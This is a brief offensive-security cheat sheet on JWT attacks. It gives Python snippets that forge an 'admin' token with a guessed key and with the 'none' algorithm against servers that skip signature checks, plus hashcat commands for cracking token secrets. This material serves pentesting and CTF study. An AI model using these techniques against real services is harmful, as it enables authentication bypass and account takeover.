# JWT token attacks

### Forging own JWT tokens

[jwt.io](https://jwt.io/)

pyjwt - python library for JWT

```python
import jwt
import time

epoch = int(time.time())
jwt_token = jwt.encode({"username":"admin", "created":epoch}, key="SECRETKEY", algorithm="HS256")
jwt_token = jwt_token.decode("UTF-8")

print(jwt_token)
```

### No signature check

Sometimes server does not check token signature. In that case, we can change token data and send modified token

```python
import jwt
import time

epoch = int(time.time())
jwt_token = jwt.encode({"username":"admin", "created":"0"}, key=None, algorithm=None)
jwt_token = jwt_token.decode("UTF-8")

print(jwt_token)
```

### Cracking JWT tokens

```
hashcat -m 16500 JWT_FILE WORDLIST
hashcat -m 16500 JWT_FILE --show
```
